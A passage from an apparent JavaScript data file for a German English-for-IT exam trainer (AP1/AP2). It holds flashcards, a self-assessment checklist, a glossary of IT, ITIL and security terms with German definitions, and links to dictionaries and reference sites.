    { topic: "vokabeln-hardware", f: "purchase / lease / rent", b: "Kauf / Leasing / Miete." },
    { topic: "vokabeln-netzwerk-security", f: "backup / restore / recovery", b: "Datensicherung / Wiederherstellung der Daten / Wiederanlauf nach einem Ausfall." },
    { topic: "fehlermeldungen", f: "is up, line protocol is down (Cisco)", b: "Schicht 1 in Ordnung, Schicht 2 gestört (Gegenstelle, Kapselung, Duplex prüfen)." },
    { topic: "fehlermeldungen", f: "TCP Retransmission (Wireshark)", b: "Segment wurde erneut gesendet – Hinweis auf Paketverlust oder Überlast." },
    { topic: "fehlermeldungen", f: "Autoconfiguration IPv4 Address 169.254.x.x", b: "APIPA – kein DHCP-Server erreicht; DHCP, Relay und VLAN prüfen." },
    { topic: "support-kommunikation", f: "incident vs. service request", b: "Störung (etwas funktioniert nicht) vs. Anfrage nach einer Standardleistung (z. B. Software, Passwort-Reset)." },
    { topic: "support-kommunikation", f: "problem / known error (ITIL)", b: "Ursache einer oder mehrerer Störungen / analysiertes Problem mit dokumentiertem Workaround." },
    { topic: "support-kommunikation", f: "pending / on hold", b: "Ticket wartet auf Zuarbeit (Anwender, Hersteller, Lieferung)." },
    { topic: "support-kommunikation", f: "first call resolution (FCR)", b: "Anteil der Anfragen, die beim ersten Kontakt gelöst werden, z. B. 180 von 240 = 75 %." },
    { topic: "support-kommunikation", f: "functional vs. hierarchical escalation", b: "an eine Stelle mit mehr Fachwissen (2nd/3rd Level) vs. an Vorgesetzte/Management." },
    { topic: "vokabeln-hardware", f: "heat sink / thermal paste", b: "Kühlkörper / Wärmeleitpaste." },
    { topic: "vokabeln-hardware", f: "1 U (rack unit)", b: "Höheneinheit im 19-Zoll-Schrank: 1,75 inch = 4,445 cm." },
    { topic: "vokabeln-netzwerk-security", f: "zero-day", b: "Schwachstelle, für die es noch keinen Patch gibt – nur Workarounds helfen." },
    { topic: "grammatik-false-friends", f: "map / concern / prospect / consequent", b: "Karte / Anliegen / Aussicht / daraus folgend – nicht: Mappe (folder) / Konzern / Prospekt (brochure) / konsequent (consistent)." },
  ],
  checklist: [
    { id: "c-lesen-1", topic: "pruefung-lesen", text: "Ich kann einen englischen Fachtext mit Skimming und Scanning auswerten und die geforderten Kernaussagen in eigenen Worten auf Deutsch wiedergeben.", exam: ["AP1", "AP2"] },
    { id: "c-lesen-2", topic: "pruefung-lesen", text: "Ich kann die Operatoren „übersetzen“, „sinngemäß wiedergeben“ und „erklären“ bei englischen Texten unterscheiden und antworte auf Deutsch, wenn nichts anderes verlangt ist.", exam: ["AP1"] },
    { id: "c-lesen-3", topic: "pruefung-lesen", text: "Ich kann unbekannte Wörter über Kontext, Wortfamilie und Vor-/Nachsilben (un-, dis-, re-, -less, -able) erschließen.", exam: ["AP1", "AP2"] },
    { id: "c-hw-1", topic: "vokabeln-hardware", text: "Ich kann typische Datenblattbegriffe wie power consumption, throughput, latency, warranty, backward compatible, daisy chaining, heater und IR ins Deutsche übersetzen und erklären.", exam: ["AP1", "AP2"] },
    { id: "c-hw-3", topic: "vokabeln-hardware", text: "Ich kann die englischen Bezeichnungen von PC- und Serverkomponenten (motherboard, cores/threads, graphics card, memory module, expansion card, heat sink, rack unit) übersetzen.", exam: ["AP1"] },
    { id: "c-hw-2", topic: "vokabeln-hardware", text: "Ich kann aus einem englischen Datenblatt Kennwerte heraussuchen (typical/max. power, Anschlüsse, Ergonomie) und damit rechnen, z. B. Stromkosten.", exam: ["AP1"] },
    { id: "c-netsec-1", topic: "vokabeln-netzwerk-security", text: "Ich kann bandwidth und throughput, authentication und authorization sowie threat, vulnerability und exploit sicher unterscheiden.", exam: ["AP1", "AP2"] },
    { id: "c-netsec-2", topic: "vokabeln-netzwerk-security", text: "Ich kann eine englische Sicherheitswarnung (security advisory) auswerten: betroffene Versionen, Risiko, empfohlene Maßnahme und Workaround.", exam: ["AP1", "AP2"] },
    { id: "c-cloud-1", topic: "vokabeln-software-cloud", text: "Ich kann Begriffe aus Release Notes und Lizenzbedingungen (update/upgrade, patch, deprecated, rollback, subscription, perpetual licence, EULA) erklären.", exam: ["AP1", "AP2"] },
    { id: "c-cloud-2", topic: "vokabeln-software-cloud", text: "Ich kann ein englisches Cloud-Angebot auswerten (tenant, data residency, pay-as-you-go, service credit) und aus einem SLA die zulässige Ausfallzeit berechnen.", exam: ["AP1", "AP2"] },
    { id: "c-cloud-3", topic: "vokabeln-software-cloud", text: "Ich kann KI-Begriffe (LLM, prompt, hallucination, bias, human in the loop) erklären und Chancen und Risiken eines KI-Chatbots benennen.", exam: ["AP1"] },
    { id: "c-abk-1", topic: "abkuerzungen", text: "Ich kann gängige IT- und Business-Akronyme (z. B. PSU, NIC, EOL, RMA, TCO, ETA, FYI, TBD, e.g., i.e.) auflösen und ihre Bedeutung erklären.", exam: ["AP1", "AP2"] },
    { id: "c-abk-2", topic: "abkuerzungen", text: "Ich kann englische Zahlen- und Datumsformate (Dezimalpunkt, billion, US-Datum MM/DD/YYYY) korrekt deuten und Zoll, Fahrenheit und Gbit/s umrechnen.", exam: ["AP1", "AP2"] },
    { id: "c-doc-1", topic: "datenblatt-manual", text: "Ich kann den Aufbau von Datenblatt, Handbuch und Quick Start Guide beschreiben und die Signalwörter DANGER, WARNING, CAUTION und NOTICE unterscheiden.", exam: ["AP1", "AP2"] },
    { id: "c-doc-2", topic: "datenblatt-manual", text: "Ich kann Changelogs und Release Notes lesen, Semantic Versioning deuten und begründen, ob ein Update sofort, geplant oder erst nach Tests eingespielt werden sollte.", exam: ["AP2"] },
    { id: "c-doc-3", topic: "datenblatt-manual", text: "Ich kann mit Werten aus einem englischen Datenblatt rechnen (Strom I = P ÷ U, PoE-Klassen und PoE-Budget, Speicherbedarf aus der Bitrate).", exam: ["AP1"] },
    { id: "c-err-1", topic: "fehlermeldungen", text: "Ich kann typische englische Netzwerkmeldungen (Request timed out, Destination host unreachable, could not find host, Media disconnected, Connection refused) deuten und den nächsten Prüfschritt nennen.", exam: ["AP1", "AP2"] },
    { id: "c-err-2", topic: "fehlermeldungen", text: "Ich kann HTTP-Statuscodes (2xx–5xx, insbesondere 401, 403, 404, 500, 503) und die Syslog-Schweregrade 0–7 zuordnen.", exam: ["AP2"] },
    { id: "c-err-3", topic: "fehlermeldungen", text: "Ich kann englische Logeinträge (z. B. SSH-Anmeldeversuche, Firewall-Blocks) analysieren, einen Angriff erkennen und Gegenmaßnahmen vorschlagen.", exam: ["AP2"] },
    { id: "c-support-1", topic: "support-kommunikation", text: "Ich kann ein Support-Telefonat auf Englisch von der Begrüßung bis zur Verabschiedung führen und dabei gezielte Fragen zum Problem stellen.", exam: [] },
    { id: "c-support-2", topic: "support-kommunikation", text: "Ich kann höflich formulieren (Could you …?, Would you mind …?, I'm afraid …) und ein Gespräch mit einem verärgerten Kunden auf Englisch deeskalieren.", exam: [] },
    { id: "c-support-3", topic: "support-kommunikation", text: "Ich kann ein englisches Ticket mit Summary, Description, Steps to reproduce, Expected/Actual result, Impact, Urgency und Priority schreiben.", exam: ["AP1"] },
    { id: "c-support-4", topic: "support-kommunikation", text: "Ich kann Namen, E-Mail-Adressen und IP-Adressen mit dem NATO-Alphabet und den englischen Namen der Sonderzeichen buchstabieren.", exam: [] },
    { id: "c-support-5", topic: "support-kommunikation", text: "Ich kann englische Service-Desk-Begriffe (incident, service request, problem, change, pending, resolved, closed, escalation, FCR, MTTR) erklären und eine englische Ticket-Historie auswerten, z. B. SLA-Zeiten nachrechnen.", exam: ["AP1"] },
    { id: "c-mail-1", topic: "business-emails", text: "Ich kann eine englische Geschäfts-E-Mail vollständig aufbauen (Betreff, Anrede, Einleitung, Hauptteil, Handlungsaufforderung, Schluss, Grußformel, Signatur).", exam: ["AP1"] },
    { id: "c-mail-2", topic: "business-emails", text: "Ich kann Anfrage, Antwort auf eine Beschwerde und Statusmeldung mit passenden formellen Redemitteln schreiben und Anrede und Grußformel korrekt kombinieren.", exam: [] },
    { id: "c-mail-3", topic: "business-emails", text: "Ich kann Netiquette-Regeln für E-Mails erklären (BCC bei Rundmails, kein Großbuchstaben-Text, Reply all mit Bedacht, keine sensiblen Daten unverschlüsselt).", exam: ["AP1", "AP2"] },
    { id: "c-praes-1", topic: "praesentieren", text: "Ich kann eine Präsentation planen (purpose, audience, key message, structure, time) und nach Einleitung – Hauptteil – Schluss gliedern.", exam: ["AP1", "AP2"] },
    { id: "c-praes-2", topic: "praesentieren", text: "Ich kann eine Präsentation auf Englisch mit Signposting-Redemitteln einleiten, überleiten, zusammenfassen und auf Fragen reagieren.", exam: [] },
    { id: "c-praes-3", topic: "praesentieren", text: "Ich kann Merkmale guter und schlechter Präsentationen sowie Regeln für Körpersprache, Haltung, Stimme und Foliengestaltung nennen und anwenden.", exam: ["AP1", "AP2"] },
    { id: "c-graf-1", topic: "prozesse-grafiken", text: "Ich kann einen IT-Prozess (z. B. DHCP-Ablauf, Störungsbearbeitung) auf Englisch mit Sequencing-Wörtern und im Passiv beschreiben.", exam: [] },
    { id: "c-graf-2", topic: "prozesse-grafiken", text: "Ich kann Diagramme mit Trendvokabular und den Präpositionen from/to, by, at beschreiben und prozentuale Veränderungen berechnen.", exam: ["AP1", "AP2"] },
    { id: "c-gram-1", topic: "grammatik-false-friends", text: "Ich kann Passiv, Imperativ und if-Sätze (Typ 0–3) in Anleitungen und Tickets erkennen und selbst korrekt bilden.", exam: [] },
    { id: "c-gram-2", topic: "grammatik-false-friends", text: "Ich kann must not und don't have to sicher unterscheiden und die häufigsten False Friends (become, eventually, actual, sensible, control, billion) vermeiden.", exam: ["AP1", "AP2"] },
  ],
  glossary: [
    { term: "APIPA", def: "Automatic Private IP Addressing – ein Client gibt sich selbst eine Adresse aus 169.254.0.0/16, wenn er keinen DHCP-Server erreicht." },
    { term: "authentication", def: "Authentifizierung – Prüfung der Identität eines Benutzers oder Geräts, z. B. per Passwort, Token oder Biometrie." },
    { term: "authorization", def: "Autorisierung – Prüfung und Vergabe der Rechte, die eine bereits authentifizierte Identität hat." },
    { term: "backward compatible", def: "abwärtskompatibel – ein Gerät oder Standard arbeitet auch mit älteren Versionen zusammen, meist mit deren Leistungsumfang." },
    { term: "bandwidth", def: "Bandbreite – theoretisch maximale Datenrate einer Verbindung, im Gegensatz zum tatsächlich erreichten Durchsatz (throughput)." },
    { term: "breaking change", def: "Inkompatible Änderung einer Software oder Schnittstelle, nach der bestehende Konfigurationen oder Programme nicht mehr wie bisher funktionieren." },
    { term: "changelog", def: "Änderungsprotokoll einer Software, meist gegliedert in Added, Changed, Deprecated, Removed, Fixed und Security." },
    { term: "daisy chaining", def: "Reihenschaltung von Geräten: Gerät 2 wird am Ausgang von Gerät 1 angeschlossen statt direkt am Rechner, z. B. Monitore per DisplayPort MST." },
    { term: "deprecated", def: "abgekündigt – eine Funktion ist noch vorhanden, wird aber in einer späteren Version entfernt und sollte ersetzt werden." },
    { term: "escalation", def: "Eskalation – Weitergabe eines Tickets an eine höhere Support-Ebene (funktional) oder an Vorgesetzte (hierarchisch)." },
    { term: "exploit", def: "Programmcode oder Vorgehen, das eine Schwachstelle gezielt ausnutzt." },
    { term: "first call resolution (FCR)", def: "Kennzahl des Service Desks: Anteil der Anfragen, die bereits beim ersten Kontakt abschließend gelöst werden." },
    { term: "False Friend", def: "Wort, das in zwei Sprachen ähnlich aussieht, aber etwas anderes bedeutet, z. B. become (werden) ≠ bekommen." },
    { term: "hallucination", def: "Antwort einer generativen KI, die plausibel klingt, inhaltlich aber falsch oder erfunden ist." },
    { term: "hot-swappable", def: "im laufenden Betrieb austauschbar, ohne das System herunterzufahren (z. B. Festplatten, Netzteile)." },
    { term: "incident", def: "Störung nach ITIL – ungeplante Unterbrechung oder Qualitätsminderung eines IT-Dienstes." },
    { term: "impact / urgency", def: "Auswirkung und Dringlichkeit einer Störung; zusammen ergeben sie über eine Prioritätsmatrix die Priorität eines Tickets." },
    { term: "known issue", def: "bekannter, vom Hersteller dokumentierter Fehler, der noch nicht behoben ist – oft mit Workaround." },
    { term: "latency", def: "Latenz – Verzögerung, bis ein Datenpaket beim Empfänger ankommt, gemessen in Millisekunden." },
    { term: "lease", def: "befristete Zuweisung einer IP-Adresse durch einen DHCP-Server, die der Client rechtzeitig verlängern muss." },
    { term: "on-premises", def: "Betrieb von Hard- und Software im eigenen Haus bzw. eigenen Rechenzentrum statt in der Cloud." },
    { term: "patch", def: "Softwarekorrektur, die Fehler oder Sicherheitslücken behebt, ohne die Hauptversion zu wechseln." },
    { term: "problem (ITIL)", def: "Ursache oder mögliche Ursache einer oder mehrerer Störungen; wird im Problem Management analysiert, bis die Grundursache (root cause) beseitigt ist." },
    { term: "power consumption", def: "Leistungsaufnahme eines Geräts in Watt; Datenblätter unterscheiden typical (typisch) und max. (maximal)." },
    { term: "Semantic Versioning", def: "Versionsschema MAJOR.MINOR.PATCH: inkompatible Änderungen erhöhen MAJOR, kompatible neue Funktionen MINOR, Fehlerkorrekturen PATCH." },
    { term: "service request", def: "Anfrage eines Anwenders nach einer vereinbarten Standardleistung, z. B. Passwort-Reset, Softwareinstallation oder Zugriffsrecht – keine Störung." },
    { term: "service credit", def: "Gutschrift, die ein Anbieter leisten muss, wenn er die im SLA zugesagte Verfügbarkeit unterschreitet." },
    { term: "signposting", def: "Sprachliche Wegweiser in einer Präsentation (z. B. „Let's move on to …“), die die Struktur für das Publikum hörbar machen." },
    { term: "Skimming / Scanning", def: "Lesestrategien: Überfliegen für den Gesamteindruck bzw. gezieltes Suchen nach bestimmten Informationen." },
    { term: "Syslog severity", def: "Schweregrade von Syslog-Meldungen von 0 (Emergency) bis 7 (Debug); je kleiner die Zahl, desto kritischer." },
    { term: "tenant", def: "Mandant – logisch abgegrenzter Bereich eines Kunden mit eigenen Benutzern und Daten in einer Cloud-Plattform." },
    { term: "throughput", def: "Durchsatz – tatsächlich erreichte Datenrate einer Verbindung; immer kleiner oder gleich der Bandbreite." },
    { term: "vendor lock-in", def: "Abhängigkeit von einem Anbieter, bei der ein Wechsel wegen proprietärer Formate, Verträge oder Aufwand sehr teuer wird." },
    { term: "vulnerability", def: "Schwachstelle in Hard- oder Software bzw. in Prozessen, die ein Angreifer ausnutzen kann." },
    { term: "warranty", def: "Garantie des Herstellers mit festgelegter Dauer und Leistung (z. B. advance replacement); nicht identisch mit der gesetzlichen Gewährleistung." },
    { term: "zero-day", def: "Schwachstelle, die bereits bekannt ist oder ausgenutzt wird, für die der Hersteller aber noch keinen Patch bereitgestellt hat." },
    { term: "workaround", def: "Übergangs- oder Umgehungslösung, mit der ein Problem vorläufig umgangen wird, bis die eigentliche Ursache behoben ist." },
  ],
  links: [
    { title: "Cambridge Dictionary (Englisch, mit Aussprache)", url: "https://dictionary.cambridge.org/", note: "Einsprachiges Wörterbuch mit Beispielsätzen und britischer/amerikanischer Aussprache." },
    { title: "LEO Wörterbuch Englisch–Deutsch", url: "https://dict.leo.org/", note: "Zweisprachiges Wörterbuch mit Forum zu Fachbegriffen." },
    { title: "Microsoft Writing Style Guide", url: "https://learn.microsoft.com/en-us/style-guide/welcome/", note: "Englische Schreibregeln für Technik-Texte, Anleitungen und Fehlermeldungen." },
    { title: "BSI – Federal Office for Information Security (englische Seiten)", url: "https://www.bsi.bund.de/EN/Home/home_node.html", note: "Englische Fachtexte und Begriffe zur IT-Sicherheit." },
    { title: "Keep a Changelog", url: "https://keepachangelog.com/", note: "Konvention für Changelogs (Added, Changed, Deprecated, Removed, Fixed, Security)." },
    { title: "Semantic Versioning", url: "https://semver.org/", note: "Spezifikation des Versionsschemas MAJOR.MINOR.PATCH." },
    { title: "PeopleCert – ITIL 4", url: "https://www.peoplecert.org/", note: "Herausgeber von ITIL 4; englische Originalbegriffe wie incident, service request, problem und change." },
  ]
});
